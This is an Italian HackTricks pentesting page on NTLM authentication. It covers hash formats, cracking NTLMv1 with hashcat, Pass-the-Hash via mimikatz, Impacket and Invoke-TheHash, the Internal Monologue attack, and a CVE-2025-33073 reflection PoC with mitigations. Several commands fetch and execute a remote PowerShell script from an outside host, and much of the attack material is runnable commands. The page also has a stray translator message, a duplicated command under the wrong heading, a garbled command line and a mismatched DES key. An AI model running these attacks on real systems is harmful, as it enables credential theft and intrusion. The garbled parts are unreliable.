# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Negli ambienti in cui sono in uso **Windows XP e Server 2003**, vengono utilizzati gli hash LM (Lan Manager), sebbene sia ampiamente riconosciuto che possono essere compromessi facilmente. Un hash LM specifico, `AAD3B435B51404EEAAD3B435B51404EE`, indica che LM non viene utilizzato e rappresenta l'hash di una stringa vuota.

Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in circostanze specifiche: in assenza di Active Directory, se il dominio non esiste, se Kerberos non funziona a causa di una configurazione errata oppure quando si tenta di stabilire connessioni usando un indirizzo IP anziché un hostname valido.

La presenza dell'intestazione **"NTLMSSP"** nei pacchetti di rete segnala un processo di autenticazione NTLM.

Il supporto dei protocolli di autenticazione LM, NTLMv1 e NTLMv2 è fornito da una DLL specifica che si trova in `%windir%\Windows\System32\msv1\_0.dll`.

**Punti chiave**:

- Gli hash LM sono vulnerabili e un hash LM vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) indica che non vengono utilizzati.
- Kerberos è il metodo di autenticazione predefinito; NTLM viene utilizzato solo in determinate condizioni.
- I pacchetti di autenticazione NTLM sono identificabili dall'intestazione "NTLMSSP".
- I protocolli LM, NTLMv1 e NTLMv2 sono supportati dal file di sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

Puoi verificare e configurare quale protocollo verrà utilizzato:

### Interfaccia grafica

Esegui _secpol.msc_ -> Criteri locali -> Opzioni di sicurezza -> Sicurezza di rete: livello di autenticazione LAN Manager. Sono disponibili 6 livelli (da 0 a 5).

![LM, NTLMv1 e NTLMv2 - Interfaccia grafica: esegui secpol.msc - Criteri locali - Opzioni di sicurezza - Sicurezza di rete: livello di autenticazione LAN Manager. Sono disponibili 6 livelli (da 0 a 5)](<../../images/image (919).png>)

### Registro

Questo imposterà il livello 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Valori possibili:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Schema di autenticazione NTLM di base del dominio

1. L'**utente** inserisce le proprie **credenziali**
2. La macchina client **invia una richiesta di autenticazione**, trasmettendo il **nome di dominio** e il **nome utente**
3. Il **server** invia la **challenge**
4. Il **client cifra** la **challenge** usando come chiave l'hash della password e la invia come response
5. Il **server invia** al **Domain Controller** il **nome di dominio, il nome utente, la challenge e la response**. Se **non** è configurato Active Directory o il nome di dominio corrisponde al nome del server, le credenziali vengono **verificate localmente**.
6. Il **Domain Controller verifica che sia tutto corretto** e invia le informazioni al server

Il **server** e il **Domain Controller** possono creare un **Secure Channel** tramite il server **Netlogon**, poiché il Domain Controller conosce la password del server (è contenuta nel database **NTDS.DIT**).

### Schema di autenticazione NTLM locale

L'autenticazione funziona come quella menzionata **in precedenza, ma** il **server** conosce l'**hash dell'utente** che tenta di autenticarsi, contenuto nel file **SAM**. Quindi, invece di chiedere al Domain Controller, il **server verifica autonomamente** se l'utente può autenticarsi.

### Challenge NTLMv1

La **lunghezza della challenge è di 8 byte** e la **response è lunga 24 byte**.

L'**hash NT (16 byte)** è diviso in **3 parti da 7 byte ciascuna** (7B + 7B + (2B+0x00\*5)): l'**ultima parte viene riempita con zeri**. Quindi, la **challenge** viene **cifrata separatamente** con ciascuna parte e i byte cifrati **risultanti** vengono **concatenati**. Totale: 8B + 8B + 8B = 24 byte.

**Problemi**:

- Mancanza di **casualità**
- Le 3 parti possono essere **attaccate separatamente** per trovare l'hash NT
- **DES è crackabile**
- La 3ª chiave è composta sempre da **5 zeri**.
- A parità di **challenge**, la **response** sarà **sempre la stessa**. Puoi quindi inviare alla vittima come **challenge** la stringa "**1122334455667788**" e attaccare la response usando **rainbow table precalcolate**.

### Attacco NTLMv1

La unconstrained delegation è meno comune negli ambienti moderni, ma un servizio **Print Spooler** raggiungibile può ancora essere abusato per forzare l'autenticazione verso un host di questo tipo.

Potresti abusare di alcune credenziali/sessioni di cui disponi già su AD per **chiedere alla stampante di autenticarsi** con un **host sotto il tuo controllo**. Poi, usando `metasploit auxiliary/server/capture/smb` o `responder`, puoi **impostare la challenge di autenticazione su 1122334455667788**, acquisire il tentativo di autenticazione e, se è stato eseguito usando **NTLMv1**, potrai **crackarlo**.\
Se usi `responder`, puoi provare a **usare il flag `--lm`** per tentare di **downgradare** l'**autenticazione**.\
_Nota che per questa tecnica l'autenticazione deve essere eseguita usando NTLMv1 (NTLMv2 non è valido)._

Ricorda che durante l'autenticazione la stampante userà l'account computer, e gli account computer usano **password lunghe e casuali** che **probabilmente non riuscirai a crackare** usando i **dizionari** comuni. Tuttavia, l'autenticazione **NTLMv1** **usa DES** ([maggiori informazioni qui](#ntlmv1-challenge)), quindi puoi riuscire a crackarla usando alcuni servizi specifici per il cracking di DES (puoi usare, ad esempio, [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com)).

### Attacco NTLMv1 con hashcat

NTLMv1 può anche essere attaccato con [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), che converte i messaggi NTLMv1 acquisiti in formati adatti a Hashcat.<sup>[[1]](#references)</sup>

Il comando

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

produrrebbe quanto segue:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Il contenuto da tradurre non è stato incluso. Inviami il testo.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Esegui hashcat (meglio in modalità distribuita tramite uno strumento come hashtopolis), altrimenti ci vorranno diversi giorni.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

In questo caso conosciamo la password, che è password, quindi per la demo faremo un piccolo trucco:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Ora dobbiamo usare hashcat-utilities per convertire le chiavi DES crackate in parti dell'hash NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Infine, l'ultima parte:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Uniscili insieme:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### Challenge NTLMv2

La **lunghezza della challenge è di 8 byte** e vengono inviate **2 risposte**: una è lunga **24 byte** e la lunghezza dell’**altra** è **variabile**.

**La prima risposta** viene creata cifrando con **HMAC_MD5** la **stringa** composta dal **client e dal dominio**, usando come **chiave** l’**hash MD4** dell’**NT hash**. Il **risultato** viene quindi usato come **chiave** per cifrare la **challenge** con **HMAC_MD5**. A questo si aggiunge una challenge del client di 8 byte. Totale: 24 B.

**La seconda risposta** viene creata usando **diversi valori** (una nuova challenge del client, un **timestamp** per evitare gli **attacchi replay**...)

Se hai un **PCAP che contiene uno scambio di autenticazione riuscito**, estrai il dominio, il nome utente, la challenge del server e la risposta NTLMv2, formatta la cattura per Hashcat e usa la modalità `5600` per tentare di recuperare la password. La guida pratica archiviata descrive la procedura per estrarre i campi dei pacchetti, mentre gli esempi di Hashcat definiscono il formato attualmente accettato.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Una volta ottenuto l’hash della vittima**, puoi usarlo per **spacciarti per lei**.\
Devi usare uno **strumento** che **esegua** l’**autenticazione NTLM usando** quell’**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell’**hash** in **LSASS**, così che venga usato quando viene eseguita un’autenticazione **NTLM**. È ciò che fa mimikatz.

**Ricorda che puoi eseguire attacchi Pass-the-Hash anche usando account computer.**

### **Mimikatz**

**Deve essere eseguito come amministratore**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Questo avvia un processo con l'utente locale corrente, mentre LSASS associa le credenziali fornite al relativo accesso di rete in uscita. Puoi quindi accedere alle risorse di rete come utente specificato, analogamente a `runas /netonly`, senza conoscere la password in testo chiaro.

### Pass-the-Hash da Linux

Puoi ottenere l'esecuzione di codice su macchine Windows usando Pass-the-Hash da Linux.\
[**Vedi esempi pratici di esecuzione Pass-the-Hash con Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Strumenti Impacket compilati per Windows

Puoi scaricare[ i binari di impacket per Windows qui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In questo caso è necessario specificare un comando; cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Sono disponibili molti altri binari Impacket...

### Invoke-TheHash

Puoi ottenere gli script powershell qui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Questa funzione combina le modalità precedenti. Puoi passare **diversi host**, escludere target selezionati e scegliere _SMBExec, WMIExec, SMBClient_ o _SMBEnum_. Se selezioni **SMBExec** o **WMIExec** senza il parametro _**Command**_, viene solo verificato se disponi di autorizzazioni sufficienti.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Deve essere eseguito come amministratore**

Questo strumento fa la stessa cosa di mimikatz (modifica la memoria di LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Esecuzione remota manuale di Windows con nome utente e password


{{#ref}}
../lateral-movement/
{{#endref}}

## Estrazione delle credenziali da un host Windows

Per ulteriori informazioni, consulta [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Attacco Internal Monologue

L’Internal Monologue Attack è una tecnica stealth di estrazione delle credenziali che consente a un aggressore di recuperare gli hash NTLM dal computer di una vittima **senza interagire direttamente con il processo LSASS**. A differenza di Mimikatz, che legge gli hash direttamente dalla memoria e viene spesso bloccato dalle soluzioni di sicurezza degli endpoint o da Credential Guard, questo attacco sfrutta **chiamate locali al pacchetto di autenticazione NTLM (MSV1_0) tramite la Security Support Provider Interface (SSPI)**. Per prima cosa, l’aggressore **abbassa il livello delle impostazioni NTLM** (ad es., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) per consentire NetNTLMv1. Quindi impersona i token utente esistenti ottenuti dai processi in esecuzione e avvia localmente l’autenticazione NTLM per generare risposte NetNTLMv1 usando una challenge nota.<sup>[[4]](#references)</sup>

Dopo aver acquisito queste risposte NetNTLMv1, l’aggressore può recuperare rapidamente gli hash NTLM originali usando **rainbow table precalcolate**, consentendo ulteriori attacchi Pass-the-Hash per il movimento laterale. È importante notare che l’Internal Monologue Attack rimane stealth perché non genera traffico di rete, non inietta codice e non attiva dump diretti della memoria, risultando quindi più difficile da rilevare per i difensori rispetto a metodi tradizionali come Mimikatz.

Se NetNTLMv1 non è accettato a causa di criteri di sicurezza imposti, l’aggressore potrebbe non riuscire a recuperare una risposta NetNTLMv1.

Per gestire questo caso, lo strumento Internal Monologue è stato aggiornato: acquisisce dinamicamente un token server tramite `AcceptSecurityContext()` per **catturare comunque risposte NetNTLMv2** se NetNTLMv1 non funziona. Sebbene NetNTLMv2 sia molto più difficile da violare, può comunque consentire relay attack o attacchi brute-force offline in casi limitati.

La PoC è disponibile in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay e Responder

**Leggi qui una guida più dettagliata su come eseguire questi attacchi:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analizzare le challenge NTLM da una cattura di rete

**Puoi usare** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* NTLM e Kerberos tramite SPN serializzati (CVE-2025-33073)

Windows include diverse mitigazioni che tentano di impedire gli attacchi di *reflection*, in cui un’autenticazione NTLM (o Kerberos) originata da un host viene inoltrata di nuovo allo **stesso** host per ottenere privilegi SYSTEM.  

Microsoft ha interrotto la maggior parte delle chain pubbliche con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e patch successive. Tuttavia, **CVE-2025-33073** dimostra che le protezioni possono ancora essere aggirate sfruttando il modo in cui il **client SMB tronca i Service Principal Name (SPN)** che contengono target-info *marshalled* (serializzati).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR del bug
1. Un aggressore registra un **record DNS A** la cui etichetta codifica uno SPN marshalled, ad es.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La vittima viene indotta ad autenticarsi verso quel nome host (PetitPotam, DFSCoerce, ecc.).
3. Quando il client SMB passa la stringa target `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **rimuove** il blob serializzato, lasciando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (o l’equivalente Kerberos) considera quindi il target *localhost*, perché la parte breve del nome host corrisponde al nome del computer (`SRV1`).
5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inserisce il **token di accesso SYSTEM di LSASS** nel contesto (per Kerberos viene creata una chiave di sessione secondaria contrassegnata come SYSTEM).
6. Inoltrando l’autenticazione con `ntlmrelayx.py` **oppure** `krbrelayx.py` si ottengono pieni privilegi SYSTEM sullo stesso host.<sup>[[5]](#references)</sup>

### PoC rapida
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Patch e mitigazioni
* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui target contenga informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Applica **SMB signing** alle destinazioni SMB relay. Per le altre destinazioni, verifica i requisiti di signing o Extended Protection specifici del protocollo e il livello delle patch; SMB signing da solo non determina se sia possibile un relay HTTPS WinRM.
* Monitora i record DNS simili a `*<base64>...*` e blocca i vettori di coercizione (PetitPotam, DFSCoerce, AuthIP...).

### Idee per il rilevamento
* Acquisizioni di rete con `NTLMSSP_NEGOTIATE_LOCAL_CALL` in cui l'IP client ≠ IP server.
* Kerberos AP-REQ contenente una chiave di subsessione e un principal client uguale al nome host.
* Logon SYSTEM di Windows Event 4624/4648 seguiti immediatamente da scritture SMB remote dallo stesso host.<sup>[[5]](#references)</sup>

Un nome DNS serializzato contenente informazioni sul target può anche indirizzare l'autenticazione forzata verso un attacker per un **relay cross-protocol** a un endpoint web-enrollment AD CS. Questo è un esito distinto dalla reflection sullo stesso host: le [condizioni di enrollment ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), i diritti di scrittura DNS, un percorso di coercizione e il livello delle patch del target devono essere valutati separatamente.

Per la variante di reflection locale del **March 2026**, che sfrutta **SMB arbitrary ports** e il **riutilizzo delle connessioni TCP** per raggiungere `NT AUTHORITY\SYSTEM`, vedi:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Multi-tool NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hash di esempio di Hashcat – NetNTLMv2 (modalità 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Utility PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Attacco Internal Monologue: recuperare hash NTLM senza accedere a LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [La reflection NTLM è morta, lunga vita alla reflection NTLM!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Craccare un hash NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
